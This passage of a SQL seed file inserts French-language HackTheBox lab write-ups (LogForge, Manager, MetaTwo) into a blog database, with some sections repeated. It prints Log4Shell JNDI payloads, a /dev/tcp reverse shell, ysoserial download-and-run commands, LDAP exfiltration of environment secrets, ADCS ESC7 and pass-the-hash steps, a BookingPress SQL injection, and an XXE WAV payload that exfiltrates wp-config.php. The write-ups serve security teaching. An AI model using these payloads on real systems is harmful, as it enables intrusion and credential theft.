*   **Ports filtrés** : 21 (FTP) et 8080 (HTTP-proxy).

L''analyse des headers HTTP montre la présence d''un cookie **JSESSIONID**, ce qui confirme un environnement **Java (J2EE)**. En provoquant une erreur 404, le serveur révèle sa version : **Apache Tomcat 9.0.31**.

### Énumération Web et Directory Brute Force

J''utilise **feroxbuster** pour découvrir des points d''entrée spécifiques à Java.

```bash
feroxbuster -u http://10.10.11.138 -x jsp,java,class
```

Les résultats affichent des codes **403 Forbidden** pour `/admin` et `/manager`. Ces répertoires sont critiques car ils permettent normalement la gestion des applications Tomcat.

### Contournement des restrictions (Orange Tsai Bypass)

Le serveur utilise Apache comme **Reverse Proxy** devant Tomcat. Je suspecte une restriction d''accès basée sur l''URL au niveau d''Apache. En utilisant une technique de **Path Traversal** spécifique au parsing différentiel entre Apache et Tomcat (présentée par Orange Tsai), je tente d''accéder au manager.

> **Schéma Mental : Bypass de Proxy**
> 1. **Apache** reçoit `/0xdf/..;/manager/`. Il ne voit pas de correspondance avec la règle de restriction `/manager`.
> 2. **Apache** transmet la requête à **Tomcat**.
> 3. **Tomcat** interprète `..;` comme une instruction de remontée de répertoire et normalise l''URL en `/manager/`.
> 4. La restriction est contournée.

L''accès à `http://10.10.11.138/0xdf/..;/manager/html` demande une **HTTP Basic Auth**. Les identifiants par défaut `tomcat:tomcat` fonctionnent, me donnant accès au **Tomcat Manager App**.

### Vecteur d''entrée : Log4Shell (CVE-2021-44228)

Bien que l''upload de fichiers **WAR** soit désactivé (limite de taille fixée à 1 octet), le nom de la machine "LogForge" suggère une vulnérabilité liée aux logs. Je teste une injection **JNDI** (Java Naming and Directory Interface) dans les champs de saisie du manager, notamment dans le paramètre `idle` de la fonction "Expire sessions".

#### Preuve de Concept (PoC)
Je prépare une écoute pour intercepter un callback **LDAP**.

```bash
# Sur ma machine d''attaque
sudo tcpdump -ni tun0 port 389
```

J''envoie le payload suivant via une requête POST :
`${jndi:ldap://10.10.14.6/file}`

Le serveur cible tente immédiatement une connexion sortante vers mon IP sur le port 389, confirmant que la bibliothèque **Log4j** interprète les expressions JNDI.

### Exploitation et Premier Shell

Pour transformer cette vulnérabilité en **RCE (Remote Code Execution)**, je dois fournir un objet Java sérialisé malveillant via un serveur LDAP factice.

> **Schéma Mental : Chaîne d''attaque Log4Shell**
> 1. **Injection** : Envoi du payload `${jndi:ldap://ATTACKER_IP/Exploit}`.
> 2. **Lookup** : Log4j déclenche une requête LDAP vers l''attaquant.
> 3. **Response** : Le serveur LDAP de l''attaquant répond avec une référence vers une classe Java ou un objet sérialisé.
> 4. **Execution** : Tomcat télécharge et exécute le code pour désérialiser l''objet.

J''utilise **ysoserial** pour générer un payload basé sur la librairie **CommonsCollections5** et **JNDI-Exploit-Kit** pour servir l''attaque.

```bash
# 1. Création du script de reverse shell
echo "#!/bin/bash" > rev.sh
echo "bash -i >& /dev/tcp/10.10.14.6/443 0>&1" >> rev.sh

# 2. Génération du payload de téléchargement via ysoserial
java -jar ysoserial.jar CommonsCollections5 ''wget 10.10.14.6/rev.sh -O /dev/shm/rev.sh'' > getrev.ser

# 3. Lancement du serveur d''exploitation LDAP
sudo java -jar JNDI-Injection-Exploit.jar -P getrev.ser -L 10.10.14.6:389
```

Après avoir déclenché le téléchargement du script, je génère un second payload pour l''exécuter :

```bash
java -jar ysoserial.jar CommonsCollections5 ''bash /dev/shm/rev.sh'' > runrev.ser
```

Je redémarre le kit d''exploitation avec `runrev.ser`, je lance un listener `nc -lnvp 443`, et j''injecte à nouveau le payload JNDI dans le champ `idle`. Je reçois une connexion : j''ai un shell en tant qu''utilisateur **tomcat**.

```bash
tomcat@LogForge:/var/lib/tomcat9$ id
uid=110(tomcat) gid=115(tomcat) groups=115(tomcat)
```

---

### Énumération Interne

Une fois le pied posé sur la machine en tant qu''utilisateur `tomcat`, ma priorité est l''énumération des services locaux et des vecteurs de **Privilege Escalation**. L''analyse des ports ouverts en local révèle des services non exposés à l''extérieur.

```bash
# Vérification des ports en écoute
netstat -tnlp

# Identification des processus tournant avec des privilèges élevés
ps auxww | grep ftp
```

Je remarque que le port **TCP 21** (FTP) est filtré et n''accepte que les connexions provenant de `localhost`. Plus intéressant encore, le service FTP est géré par une archive Java située à la racine : `/root/ftpServer-1.0-SNAPSHOT-all.jar`. Ce processus tourne avec les privilèges **root**.

---

### Analyse du vecteur d''attaque (Reverse Engineering)

Pour comprendre comment interagir avec ce serveur FTP, je transfère le fichier JAR sur ma machine d''attaque pour une analyse statique via **JD-GUI**.

> Schéma Mental :
> 1. **Source** : Le serveur FTP accepte une entrée utilisateur (le username).
> 2. **Sink** : Cette entrée est passée directement à un logger **Log4j**.
> 3. **Objectif** : Utiliser une injection **JNDI** pour exfiltrer des données sensibles stockées en mémoire.

L''examen du code source révèle deux points critiques :
1.  **Vulnérabilité Log4Shell** : Dans la classe `Worker`, la méthode `handleUser` logue les tentatives de connexion infructueuses avec un niveau `WARN`, incluant directement le `username` fourni par l''utilisateur.
2.  **Secrets en variables d''environnement** : Les identifiants valides ne sont pas codés en dur mais récupérés via `System.getenv("ftp_user")` et `System.getenv("ftp_password")`.

```java
// Extrait de la classe Worker.class
private void handleUser(String username) {
    LOGGER.warn("Login with invalid user: " + username); // Point d''injection
    if (username.toLowerCase().equals(this.validUser)) {
        // ...
    }
}

private String validUser = System.getenv("ftp_user");
private String validPassword = System.getenv("ftp_password");
```

---

### Mouvement Latéral & Exfiltration de données

Puisque le serveur FTP utilise une version vulnérable de **Log4j**, je peux exploiter les **Lookups** JNDI pour forcer le serveur à envoyer des requêtes **LDAP** vers ma machine. En encapsulant les variables d''environnement dans le chemin de l''URL LDAP, je peux les intercepter.

#### 1. Préparation de l''écouteur
J''utilise `tcpdump` ou un simple `nc` combiné à `xxd` pour capturer les requêtes entrantes et visualiser les données exfiltrées.

```bash
# Capture des requêtes LDAP sur le port 389
sudo tcpdump -ni tun0 port 389 -A
```

#### 2. Injection JNDI via FTP
Je me connecte au service FTP local depuis mon shell `tomcat` et j''injecte le payload dans le champ `USER`. Le format `${env:VARIABLE}` permet de résoudre la variable d''environnement avant l''envoi de la requête.

```bash
# Connexion locale
ftp localhost

# Injection pour exfiltrer le username et le password
Name (localhost:tomcat): ${jndi:ldap://10.10.14.6/user:${env:ftp_user}:pass:${env:ftp_password}}
```

#### 3. Interception des secrets
Sur ma machine d''attaque, la requête LDAP arrive. Le chemin de l''URL contient les valeurs résolues des variables d''environnement du processus **root**.

> Schéma Mental :
> `Payload` -> `Log4j` -> `Lookup Engine` -> `Resolution de ${env:...}` -> `Requête LDAP vers l''attaquant` -> `Leak des credentials`.

---

### Escalade de Privilèges (Root)

Une fois les identifiants `ftp_user` et `ftp_password` récupérés (ex: `ippsec` : `[REDACTED]`), je teste leur validité pour une authentification système. Il est fréquent que les administrateurs réutilisent les mots de passe de services pour les comptes utilisateurs ou le compte **root**.

```bash
# Tentative de passage en root avec le mot de passe exfiltré
su -
```

Le mot de passe récupéré via la fuite mémoire de **Log4j** me permet d''obtenir un shell interactif avec les privilèges maximaux. Je peux désormais lire le flag final dans `/root/root.txt`.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois le pied posé sur la machine en tant qu''utilisateur `tomcat`, l''objectif est d''identifier des vecteurs de mouvement latéral ou d''élévation verticale. L''énumération des ports locaux révèle un service **FTP** (port 21) filtré, inaccessible de l''extérieur.

#### Énumération et Analyse du Service Interne
L''inspection des processus montre qu''un serveur FTP Java tourne avec les privilèges **root**. Le fichier JAR associé se trouve à la racine : `/ftpServer-1.0-SNAPSHOT-all.jar`.

```bash
# Identification du processus root
ps auxww | grep ftp
# Analyse des connexions locales
netstat -tnlp | grep :21
```

Après avoir récupéré le JAR pour analyse locale via un **Decompiler** (type `jd-gui`), j''identifie deux points critiques dans la classe `Worker` :
1.  **Sink de vulnérabilité** : La méthode `handleUser` logue les tentatives de connexion échouées via **Log4j** sans assainissement : `LOGGER.warn("Login with invalid user: " + username);`.
2.  **Secrets en mémoire** : Les identifiants valides sont récupérés depuis des **Environment Variables** : `ftp_user` et `ftp_password`.

> **Schéma Mental : Exfiltration par Injection JNDI**
> 1. L''attaquant se connecte au FTP local.
> 2. Il injecte une charge **Log4j** dans le champ `USER`.
> 3. Le serveur FTP (root) traite le log.
> 4. **Log4j** interprète le lookup `${env:VAR}`.
> 5. Le serveur initie une requête **LDAP** vers l''attaquant, incluant la valeur de la variable dans l''URL.

#### Exfiltration des Secrets via Log4Shell
Puisque le serveur FTP tourne sous Java et utilise une version vulnérable de **Log4j**, je peux utiliser les **JNDI Lookups** pour forcer le serveur à me transmettre ses variables d''environnement.

Je prépare une écoute avec `tcpdump` ou `Wireshark` sur ma machine d''attaque, puis je déclenche la fuite de données depuis le shell `tomcat` :

```bash
# Connexion au FTP local et injection pour exfiltrer l''utilisateur
ftp localhost
# Name: ${jndi:ldap://10.10.14.6/user:${env:ftp_user}}

# Injection pour exfiltrer le mot de passe
# Name: ${jndi:ldap://10.10.14.6/pass:${env:ftp_password}}
```

Côté attaquant, la requête **LDAP** entrante révèle les credentials dans le **Path** de l''URL :
*   `ftp_user` : `ippsec`
*   `ftp_password` : `[REDACTED_PASSWORD]`

#### Compromission Totale (Root)
Le mot de passe récupéré est réutilisé pour le compte **root** du système. Une simple commande `su -` permet d''obtenir une domination totale.

```bash
# Passage en root
su -
# Lecture du flag final
cat /root/root.txt
```

---

### Analyse Post-Exploitation : Beyond Root

L''exploitation de **Log4Shell** dans ce scénario ne nécessite pas forcément un **Exploit Kit** complexe si l''on cherche uniquement à lire des données. L''analyse du protocole **LDAP** au niveau binaire permet de comprendre comment intercepter ces informations avec des outils minimalistes.

#### Interception LDAP avec Netcat
Il est possible de simuler un serveur LDAP rudimentaire capable de répondre positivement à un **Bind Request** pour forcer le client à envoyer sa requête de recherche (**Search Request**) contenant nos données exfiltrées.

```bash
# Simulation d''un LDAP Bind Response (Success) via echo et nc
echo -e ''0\x0c\x02\x01\x01a\x07\x0a\x01\x00\x04\x00\x04\00'' | nc -nvv -l -p 389 | xxd
```

#### Analyse du Protocole Binaire
Le protocole **LDAP** utilise l''encodage **ASN.1 BER** (Basic Encoding Rules). Une requête se décompose en `[Type] [Length] [Value]`.
*   **Bind Request** : Le client initie la session. Notre réponse `0x61` (Bind Response) avec un code `0x00` (success) valide l''étape.
*   **Search Request** (`0x63`) : C''est ici que le client transmet l''URL JNDI. Dans le dump hexadécimal, on retrouve les chaînes de caractères correspondant aux variables d''environnement après le tag `0x04` (Octet String).

Cette méthode "low-tech" est particulièrement efficace en environnement restreint où l''installation de serveurs LDAP complets (comme `marshalsec`) est impossible ou trop bruyante.',
  'HackTheBox',
  'Hard',
  40,
  ARRAY['Log4j', 'Java', 'RCE', 'FTP'],
  'Je commence par une phase classique de reconnaissance avec **Nmap** pour identifier la surface d''attaque.',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: Manager
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: Manager',
  'hackthebox-manager',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Easy</div>
  <div class="points">Points: 20</div>
  <div class="os">OS: Windows</div>
</div>



### 1. Scanning et Énumération de Surface

Ma reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque. La présence de services comme **Kerberos (88)**, **LDAP (389/636)** et **SMB (445)** confirme immédiatement que la cible est un **Domain Controller (DC)** Windows.

```bash
# Scan rapide des ports ouverts
nmap -p- --min-rate 10000 10.10.11.236

# Scan de services détaillé
nmap -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389 -sCV 10.10.11.236
```

**Points clés identifiés :**
*   **Hostname :** DC01
*   **Domain :** `manager.htb`
*   **OS :** Windows Server 2019
*   **Services critiques :** **MSSQL (1433)** et **WinRM (5985)**.

Je mets à jour mon fichier `/etc/hosts` pour résoudre `manager.htb` et `dc01.manager.htb`.

---

### 2. Énumération Active Directory : RID Cycling

Le service **SMB** autorise les sessions anonymes ou via le compte `guest`. J''exploite cette faiblesse pour effectuer une attaque par **RID Cycling** afin d''énumérer la liste des utilisateurs du domaine.

```bash
# Énumération des utilisateurs via lookupsid
lookupsid.py guest@10.10.11.236 -no-pass
```

Cette étape me permet d''extraire une liste d''utilisateurs valides : `administrator`, `zhong`, `cheng`, `ryan`, `raven`, `jinwoo`, `chinhae`, et surtout **operator**.

> **Schéma Mental :**
> Accès Anonyme SMB -> Requêtes RPC (LSA) -> Incrémentation des Relative Identifiers (RID) -> Mapping SID vers Username -> Constitution d''une Wordlist d''utilisateurs ciblés.

---

### 3. Brèche Initiale : Password Spraying & MSSQL

Avec ma liste d''utilisateurs, je tente une attaque de **Password Spraying** basique en testant si un utilisateur utilise son propre nom comme mot de passe.

```bash
# Test de login Username == Password
netexec smb manager.htb -u users.txt -p users.txt --no-brute --continue-on-success
```

Le compte **operator:operator** est valide. Bien que ce compte n''ait pas de privilèges administratifs et ne puisse pas se connecter via **WinRM**, il possède des accès sur l''instance **MSSQL**.

Je me connecte à la base de données avec l''authentification Windows :
```bash
mssqlclient.py -windows-auth manager.htb/operator:operator@manager.htb
```

---

### 4. Exploration du File System via MSSQL

L''utilisateur `operator` n''a pas les droits pour activer `xp_cmdshell`, m''empêchant d''exécuter des commandes système directement. Cependant, la procédure stockée **xp_dirtree** est disponible. Elle permet de lister les fichiers et répertoires du système.

```sql
# Listing du répertoire web racine
SQL> xp_dirtree C:\inetpub\wwwroot, 1, 1
```

Je découvre un fichier inhabituel : `website-backup-27-07-23-old.zip`.

---

### 5. Extraction de Crédentiels et Premier Shell

Je télécharge l''archive depuis le serveur web (port 80) et l''analyse. Elle contient un fichier de configuration caché nommé `.old-conf.xml`.

```bash
wget http://manager.htb/website-backup-27-07-23-old.zip
unzip website-backup-27-07-23-old.zip
cat .old-conf.xml
```

Le fichier révèle des identifiants pour l''utilisateur **raven** :
*   **User :** `raven@manager.htb`
*   **Password :** `R4v3nBe5tD3veloP3r!123`

L''énumération **LDAP** préalable (via `ldapdomaindump`) indiquait que `raven` fait partie du groupe **Remote Management Users**. Je peux donc obtenir un shell via **WinRM**.

```bash
# Connexion via Evil-WinRM
evil-winrm -i manager.htb -u raven -p ''R4v3nBe5tD3veloP3r!123''
```

> **Schéma Mental :**
> Accès MSSQL -> Fuite d''information (Information Disclosure) via xp_dirtree -> Découverte d''un Backup Web -> Analyse de fichier de config (Hardcoded Credentials) -> Pivot vers un utilisateur avec accès distant (WinRM).

---

### Énumération Interne & Mouvement Latéral

Une fois les identifiants du compte **operator** validés via **Password Spraying** (operator:operator), mon objectif est d''explorer les vecteurs de post-exploitation, notamment via le service **MSSQL** identifié lors du scan initial.

#### Énumération MSSQL & Extraction de données

Le compte **operator** dispose d''un accès au serveur **MSSQL** (port 1433). J''utilise **mssqlclient.py** avec l''authentification Windows pour interagir avec l''instance.

```bash
# Connexion à l''instance MSSQL
mssqlclient.py -windows-auth manager.htb/operator:operator@manager.htb

# Vérification des privilèges et exploration du système de fichiers
SQL> xp_dirtree ''C:\'', 1, 1
SQL> xp_dirtree ''C:\inetpub\wwwroot'', 1, 1
```

> **Schéma Mental :**
> **Accès Initial (operator)** -> **MSSQL (xp_dirtree)** -> **Web Root Enumeration** -> **Découverte d''Archive Backup** -> **Extraction de Secrets**.

La procédure **xp_dirtree** révèle un fichier inhabituel dans le répertoire web : `website-backup-27-07-23-old.zip`. Je télécharge cette archive via le serveur HTTP (port 80).

#### Analyse du Backup & Pivot vers l''utilisateur Raven

L''archive contient un fichier de configuration caché nommé `.old-conf.xml`. Ce fichier expose des identifiants en clair pour un autre utilisateur du domaine.

```bash
# Extraction et lecture du secret
unzip website-backup-27-07-23-old.zip
cat .old-conf.xml
# Résultat : raven@manager.htb / R4v3nBe5tD3veloP3r!123
```

Je vérifie si cet utilisateur a des droits d''accès à distance via **WinRM**.

```bash
netexec winrm manager.htb -u raven -p ''R4v3nBe5tD3veloP3r!123''
evil-winrm -i manager.htb -u raven -p ''R4v3nBe5tD3veloP3r!123''
```

### Escalade de Privilèges : Exploitation ADCS (ESC7)

En tant que **raven**, j''effectue une énumération des services de certificats Active Directory (**ADCS**) pour identifier des mauvaises configurations de modèles (**Certificate Templates**).

#### Énumération des vulnérabilités ADCS

J''utilise **Certipy** pour auditer les **Certificate Authorities (CA)** et les permissions associées.

```bash
certipy find -dc-ip 10.10.11.236 -u raven@manager.htb -p ''R4v3nBe5tD3veloP3r!123'' -vulnerable -stdout
```

L''outil identifie une vulnérabilité de type **ESC7** sur la CA `manager-DC01-CA`. L''utilisateur **raven** possède le droit **ManageCA**, ce qui permet de prendre le contrôle total de l''autorité de certification.

> **Schéma Mental (Exploitation ESC7) :**
> **ManageCA Right** -> **Octroi du droit ManageCertificates** -> **Requête de certificat SubCA (échouée mais enregistrée)** -> **Approbation manuelle de la requête** -> **Récupération du certificat Administrator** -> **Pass-the-Certificate/NTLM Extraction**.

#### Chaîne d''attaque ESC7

1. **Élévation de privilèges sur la CA** : Je m''ajoute le droit **Manage Certificates** (Officer).
2. **Requête de certificat** : Je demande un certificat basé sur le modèle **SubCA** pour l''utilisateur **administrator**.
3. **Approbation** : En tant qu''officier de la CA, j''approuve ma propre requête en attente.
4. **Récupération** : Je télécharge le certificat finalisé.

```bash
# 1. Ajouter le rôle d''officier (Manage Certificates)
certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p ''R4v3nBe5tD3veloP3r!123''

# 2. Demander le certificat (ID de requête généré, ex: 13)
certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p ''R4v3nBe5tD3veloP3r!123''

# 3. Approuver la requête ID 13
certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p ''R4v3nBe5tD3veloP3r!123''

# 4. Récupérer le certificat au format PFX
certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p ''R4v3nBe5tD3veloP3r!123''
```

#### Compromission finale (Domain Admin)

Une fois le fichier `administrator.pfx` obtenu, je l''utilise pour authentifier l''utilisateur **administrator** auprès du **Domain Controller** et extraire son hash **NTLM**.

```bash
# Synchronisation de l''heure (crucial pour Kerberos)
sudo ntpdate 10.10.11.236

# Authentification et extraction du hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236

# Accès final via Pass-the-Hash
evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l''accès établi en tant que **Raven**, ma priorité est d''énumérer les vecteurs d''élévation de privilèges au sein de l''**Active Directory**. Compte tenu de la nature de la machine, je me concentre sur l''**ADCS** (**Active Directory Certificate Services**), un vecteur d''attaque devenu critique dans les environnements Windows modernes.

#### Énumération ADCS avec Certipy

J''utilise **Certipy** pour identifier d''éventuelles vulnérabilités dans les modèles de certificats (**Certificate Templates**) ou les configurations de l''**Authority** (CA).

```bash
certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p ''R4v3nBe5tD3veloP3r!123'' -vulnerable -stdout
```

L''outil identifie une vulnérabilité de type **ESC7** sur la CA `manager-DC01-CA`. Le rapport indique que l''utilisateur **Raven** possède le droit **ManageCA**.

> **Schéma Mental :** L''exploitation **ESC7** repose sur une hiérarchie de privilèges au sein de l''**ADCS**. Si je possède le droit **ManageCA**, je peux m''octroyer le droit **Manage Certificates**. Avec ce dernier, je peux valider manuellement une requête de certificat initialement rejetée (car basée sur un template sensible comme **SubCA**), me permettant ainsi de forger une identité pour n''importe quel utilisateur du domaine, y compris l''**Administrator**.

#### Exploitation de la vulnérabilité ESC7

**1. Octroi du droit "Manage Certificates"**
Je commence par utiliser mon droit **ManageCA** pour ajouter **Raven** en tant qu''officier de délivrance (**Officer**), ce qui correspond au droit **Manage Certificates**.

```bash
certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p ''R4v3nBe5tD3veloP3r!123''
```

**2. Requête du template SubCA**
Je tente de demander un certificat basé sur le template **SubCA**. Cette requête échouera initialement (accès refusé), mais générera un **Request ID** et une clé privée locale.

```bash
certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p ''R4v3nBe5tD3veloP3r!123''
```
*Note : Je note le Request ID (ex: 13) et je sauvegarde la clé `13.key`.*

**3. Approbation manuelle de la requête**
Grâce à mon nouveau droit de gestion des certificats, j''approuve ma propre requête précédemment rejetée.

```bash
certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p ''R4v3nBe5tD3veloP3r!123''
```

**4. Récupération du certificat Administrator**
Une fois la requête approuvée par la CA, je récupère le certificat final au format **PFX**.

```bash
certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p ''R4v3nBe5tD3veloP3r!123''
```

#### Compromission Totale (Root)

Avant d''utiliser le certificat pour m''authentifier, je dois synchroniser l''horloge de mon système avec celle du **Domain Controller** pour éviter les erreurs de ticket **Kerberos**.

```bash
sudo ntpdate 10.10.11.236
```

J''utilise ensuite le fichier `administrator.pfx` pour obtenir le **NTLM Hash** du compte **Administrator**.

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
```

L''outil me retourne le hash : `ae5064c2f62317332c88629e025924ef`. Je peux maintenant finaliser l''attaque via une session **Evil-WinRM** en utilisant la technique du **Pass-The-Hash**.

```bash
evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
```

#### Analyse Post-Exploitation (Beyond Root)

La compromission de cette machine met en lumière plusieurs failles structurelles :

1.  **Hygiène des mots de passe :** L''utilisation du nom d''utilisateur comme mot de passe pour le compte `operator` a permis l''accès initial au **MSSQL**.
2.  **Exposition de sauvegardes :** La présence d''une archive `.zip` dans le répertoire **webroot** contenant des fichiers de configuration sensibles (`.old-conf.xml`) est une erreur de gestion de configuration classique mais fatale.
3.  **Gouvernance ADCS :** Le vecteur **ESC7** est particulièrement furtif. Accorder le droit **ManageCA** à un utilisateur non-administrateur (Raven) revient à lui donner les clés du domaine à moyen terme. Une surveillance stricte des permissions sur les objets **PKI** dans l''**Active Directory** est indispensable.
4.  **Persistance :** Le certificat généré pour l''administrateur a une durée de validité potentiellement longue. Même si le mot de passe de l''administrateur est changé, le certificat reste valide pour l''authentification jusqu''à sa révocation ou son expiration.',
  'HackTheBox',
  'Easy',
  20,
  ARRAY['Active Directory', 'MSSQL', 'RID Cycling'],
  'Ma reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque. La présence de services comme **Kerberos (88)**, **LDAP (389/636)** et **SMB (445)** confirme immédiatem...',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;

-- Writeup: MetaTwo
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, created_at)
VALUES (
  'HackTheBox: MetaTwo',
  'hackthebox-metatwo',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Easy</div>
  <div class="points">Points: 20</div>
  <div class="os">OS: Linux</div>
</div>


# Phase 1 : Reconnaissance & Brèche Initiale

## 1. Énumération et Scanning

Ma phase de reconnaissance débute par un scan **Nmap** complet pour identifier la surface d''attaque.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.186

# Scan détaillé des services identifiés
nmap -p 21,22,80 -sCV 10.10.11.186
```

Le scan révèle trois services :
*   **FTP (21)** : ProFTPD (Debian). L''accès **Anonymous** est désactivé.
*   **SSH (22)** : OpenSSH 8.4p1.
*   **HTTP (80)** : Nginx 1.18.0. Le serveur redirige vers `http://metapress.htb/`.

J''ajoute l''entrée correspondante dans mon fichier `/etc/hosts` :
```text
10.10.11.186 metapress.htb
```

Une recherche de sous-domaines via **wfuzz** ne donne aucun résultat probant, je me concentre donc sur l''application web principale.

---

## 2. Analyse de la Surface Web (metapress.htb)

L''application est propulsée par **WordPress 5.6.2**. En explorant le site, je repère une page `/events/` utilisant le plugin **BookingPress**. 

> **Schéma Mental : Identification du Vecteur**
> WordPress (CMS) -> Plugins tiers -> Recherche de vulnérabilités connues (Exploit-DB/WPSec) -> **BookingPress < 1.0.11** est vulnérable à une **Unauthenticated SQL Injection**.

### Exploitation de la SQL Injection
La vulnérabilité réside dans l''action `bookingpress_front_get_category_services`. Pour l''exploiter, je dois d''abord récupérer un **Nonce** (un jeton de sécurité à usage unique) présent dans le code source de la page `/events/`.

Une fois le **Nonce** en main, j''utilise **SQLmap** pour automatiser l''extraction des données via le paramètre vulnérable `total_service`.

```bash
# Requête capturée (sqli.req) pour SQLmap
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
Content-Type: application/x-www-form-urlencoded

action=bookingpress_front_get_category_services&_wpnonce=<NONCE>&category_id=33&total_service=1

# Extraction des utilisateurs et des hashes
sqlmap -r sqli.req -p total_service --dbms=MySQL -D blog -T wp_users --dump
```

Je récupère deux comptes :
1.  **admin** : `$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.`
2.  **manager** : `$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70`

Le hash du compte **manager** est cassé instantanément avec **Hashcat** et la liste `rockyou.txt` :
`manager : partylikearockstar`

---

## 3. Escalade vers le système via XXE

Le compte **manager** n''a pas les privilèges suffisants pour éditer des thèmes ou installer des plugins. Cependant, la version de **WordPress (5.6.2)** est vulnérable à une **XML External Entity (XXE)** lors de l''upload de fichiers de type **WAV** (**CVE-2021-29447**).

> **Schéma Mental : XXE via Media Upload**
> Upload WAV -> Parsing des métadonnées iXML par PHP -> Définition d''une entité externe -> Lecture de fichiers locaux (LFI) -> Exfiltration via une requête HTTP vers mon serveur.

Je prépare un fichier `payload.wav` malveillant et un fichier `evil.dtd` pour l''exfiltration.

```bash
# Création du payload WAV
echo -en ''RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM "http://10.10.14.6/evil.dtd">%remote;%init;%trick;]>\x00'' > payload.wav

# Contenu de evil.dtd (Lecture du wp-config.php)
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM ''http://10.10.14.6/?p=%file;''>">
```

En téléversant `payload.wav` dans la bibliothèque multimédia, le serveur traite l''entité XML et m''envoie le contenu de `wp-config.php` encodé en **Base64**.

---

## 4. Premier Shell (Initial Access)

L''analyse du fichier `wp-config.php` révèle des identifiants pour le service **FTP** :
*   **FTP_USER** : `metapress.htb`
*   **FTP_PASS** : `9NYS_ii@FyL_p5M2NvJ`

Je me connecte en **FTP** et découvre un répertoire `/mailer` contenant un script PHP nommé `send_email.php`. Ce script contient des identifiants **SMTP** pour un utilisateur système :

```php
$mail->Username = "jnelson@metapress.htb";
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
```

Ces identifiants sont valides pour une connexion **SSH**.

```bash
ssh jnelson@metapress.htb
```

Je stabilise mon shell et récupère le flag `user.txt`.

---

### Énumération Interne & Post-Exploitation

Une fois l''accès **SSH** établi en tant que `jnelson`, ma priorité est l''énumération de l''environnement local pour identifier des vecteurs d''escalade de privilèges.

```bash
# Vérification des privilèges sudo
sudo -l

# Énumération des fichiers cachés dans le répertoire personnel
ls -la /home/jnelson
```

L''utilisateur `jnelson` ne possède aucun droit **sudo**. Cependant, la présence d''un répertoire caché nommé `.passpie` attire mon attention. **Passpie** est un gestionnaire de mots de passe en ligne de commande qui stocke les identifiants dans des fichiers chiffrés via **GnuPG**.

### Analyse de Passpie

L''exécution de la commande `passpie` révèle l''existence de deux entrées : une pour `jnelson` et une pour `root`.

```bash
jnelson@meta2:~$ passpie
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛
```

Les mots de passe sont stockés dans `~/.passpie/ssh/root.pass` sous forme de messages **PGP** chiffrés. Pour les lire, je dois posséder la **Passphrase** de la **PGP Private Key** située dans `~/.passpie/.keys`.

> **Schéma Mental : Chaîne de Dépendance Passpie**
> 1. **Fichier .pass** : Contient le mot de passe chiffré (PGP Message).
> 2. **Fichier .keys** : Contient la **PGP Private Key** nécessaire au déchiffrement.
> 3. **Passphrase** : Verrouille la clé privée. Si je cracke la passphrase, je déverrouille la clé, et donc l''accès aux mots de passe en clair.

### Extraction et Cracking de la Clé PGP

Je récupère le fichier `.keys` sur ma machine d''attaque pour tenter un **Brute Force** hors-ligne. Le fichier contient à la fois la clé publique et la clé privée ; je dois isoler la clé privée pour que les outils de cracking fonctionnent correctement.

```bash
# Transfert de la clé vers la machine d''attaque
scp jnelson@metapress.htb:/home/jnelson/.passpie/.keys ./pgp_keys

# Conversion de la Private Key en format crackable par John The Ripper
# Note : Supprimer le bloc "Public Key" manuellement avant conversion
gpg2john pgp_private_key.asc > gpg.hash

# Attaque par dictionnaire avec RockYou
john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash
```

Le hash est cassé instantanément, révélant la passphrase : `blink182`.

